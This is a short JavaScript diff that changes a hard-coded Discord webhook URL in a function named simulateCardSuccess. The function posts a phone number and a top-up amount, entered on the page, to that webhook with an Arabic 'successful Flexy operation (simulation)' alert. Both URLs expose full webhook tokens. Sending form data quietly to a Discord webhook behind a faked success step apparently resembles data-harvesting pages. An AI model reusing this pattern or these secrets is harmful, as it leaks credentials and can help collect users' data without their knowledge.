@@ -108,7 +108,7 @@ function simulateCardSuccess() {
     
     const phone = document.getElementById('phone-input').value;
     const amount = document.getElementById('amount-input').value;
-    const webhookUrl = "https://discord.com/api/webhooks/1548058991932735519/SVFQjWiLGhN24W238yzbkm1Mh0WpGYZgCuen9P-cIkoHdTvq70ZvgpR8UkBGQtN1vKFh";
+    const webhookUrl = "https://discord.com/api/webhooks/1547196034424381572/I3iRzrsI8kREO0wDunsfhu2USj--J3phlzChDKD2TY4IN3Ju8shMBi5yf7QKRQhO91Li";
     
     const payload = {
         content: `🚨 **تنبيه عملية فليكسي ناجحة (محاكاة)**\n🌐 **الشبكة:** ${selectedOp}\n📱 **رقم الهاتف:** ${phone}\n💰 **المبلغ:** ${amount} دج\n✅ **الحالة:** تمت العملية بنجاح.`
